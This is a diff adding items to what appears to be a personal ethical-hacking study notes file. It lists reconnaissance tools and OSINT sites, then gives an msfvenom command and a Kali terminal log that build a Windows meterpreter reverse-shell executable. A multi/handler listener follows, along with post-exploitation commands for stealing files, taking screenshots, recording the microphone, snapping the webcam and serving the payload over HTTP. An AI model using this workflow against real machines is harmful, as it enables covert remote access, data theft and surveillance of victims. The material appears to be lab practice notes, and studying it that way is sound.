@@ -249,6 +249,70 @@ whois google.com and whoislookup in website with gui
 3.whatsmyname.com
 haveibeenpwned.com to check we hacked
 cladai
+************************************
+FInd firewall present on web site to check wafw00f
+osi model application layer -firewall
+dmitry command
+nikto command (cve org)
+lbd to check load balancer
+perl ldb.pl google.com
+**try all ldb command**
+nmap same result like angryip scanner
+systemctl enable ssh enable ssh
+**note-true positive,true negative,false positive,false negative**
+readnotify to check mail received to client 
+**hsts alternative for http**
+wappalizer tool g extension
+**install autopsy**
+viewdns.info
+sherlock command check same like whatsmyname
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=youripaddress LPORT=ANYPORT -f exe -0 filename
+┌──(root㉿kali)-[/home/midhun]
+└─# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.147 LPORT=4444 -f exe -o midhun.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7680 bytes
+Saved as: midhun.exe
+                                                                                           
+┌──(root㉿kali)-[/home/midhun]
+└─# msfconsole
+msf > use multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf exploit(multi/handler) > 
+msf exploit(multi/handler) > set LHOST 192.168.0.147
+LHOST => 192.168.0.147
+msf exploit(multi/handler) > set LPORT 4444
+LPORT => 4444
+msf exploit(multi/handler) > run
+meterpreter > screenshot
+Screenshot saved to: /home/midhun/SPExtCdh.jpeg
+background
+ps
+download secret.txt
+screenshot
+upload file.txt
+cd /home
+ls
+getuid
+sysinfo
+execute -f cmd.exe
+kill PID
+record_mic
+webcam_snap
+cd foldername
+
+
+python3 -m http.server 80
+
+
+
+
+
+
 
 
 
